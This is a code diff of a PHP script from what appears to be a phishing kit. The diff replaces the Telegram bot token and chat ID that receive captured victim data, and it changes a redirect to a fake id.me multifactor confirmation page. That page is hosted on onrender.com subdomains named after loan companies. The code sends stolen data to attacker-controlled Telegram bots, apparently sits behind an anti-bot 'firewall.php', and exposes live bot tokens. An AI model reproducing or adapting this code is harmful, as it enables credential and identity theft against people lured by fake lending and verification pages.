@@ -16,8 +16,8 @@ include 'firewall.php';
             'chat_id' => '1325797388'
         ],
         [
-            'token' => '7626186834:AAH1zXLXNUx6vuLr_E8ALbxAcve7Mr0TFj0',
-            'chat_id' => '7521156137'
+            'token' => '7570530329:AAGCyvAYZQd45RebzrTY1oHoDEOmxe1ackI',
+            'chat_id' => '6494353790'
         ]
         // Add more bots here if needed
     ];
@@ -91,7 +91,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://upstartloans-elul.onrender.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
+header("Location:https://lendingpoint.onrender.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
 }
 ?>
